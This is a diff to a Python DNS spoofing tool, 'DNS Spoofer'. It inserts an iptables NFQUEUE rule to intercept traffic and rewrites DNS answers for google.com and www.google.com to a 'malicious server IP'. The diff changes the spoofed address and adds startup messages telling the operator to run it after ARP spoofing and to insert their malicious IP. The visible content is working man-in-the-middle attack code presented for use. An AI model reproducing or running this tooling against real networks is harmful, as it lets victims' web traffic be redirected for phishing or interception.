@@ -22,8 +22,8 @@ import pyfiglet
 
 # DNS host records, for instance here, we want to spoof google.com
 dns_hosts = {
-    b"google.com.": "192.168.40.113", # CHANGE THIS + ADD MALICIOUS SERVER IP
-    b"www.google.com.": "192.168.40.113", # SAME
+    b"google.com.": "192.168.1.113", # CHANGE THIS + ADD MALICIOUS SERVER IP
+    b"www.google.com.": "192.168.1.113", # SAME
 }
 
 def process_packet(packet):
@@ -50,7 +50,7 @@ def modify_packet(packet):
     """
     Modifies the DNS response to match our `dns_hosts` dictionary. 
     For example, when we get a response from google.com, 
-    this function replaces the real IP address with a fake IP address (192.168.40.113).
+    this function replaces the real IP address with a fake IP address (192.168.1.113).
     """
     
     # Get the domain name of the DNS request
@@ -77,10 +77,14 @@ def modify_packet(packet):
 
 
 if __name__ == "__main__":
-    header = pyfiglet.figlet_format("DNS Spoofer", font = "slant")
-    print("\033[1;31m"+header)
+    print('\033[1;32m[+] Starting DNS Spoofing Program... \n[!] Pls, run it AFTER launching ARP Spoofing')
+    f = open('banner.txt', 'r')
+    header = f.read()
+    print ('\033[1;31m' + header)
+    header2 = pyfiglet.figlet_format("DNS Spoofer", font = "slant")
+    print("\033[1;31m"+header2)
     print("© All credits to NextGenSpoofer  \n")
-    print("!!! Don't forget to change the source code for dns_hosts")
+    print("[!!!] Don't forget to change the source code for dns_hosts (insert your malicious ip) or this won't work")
     QUEUE_NUM = 0
     # insert iptables FORWARD rule
     os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
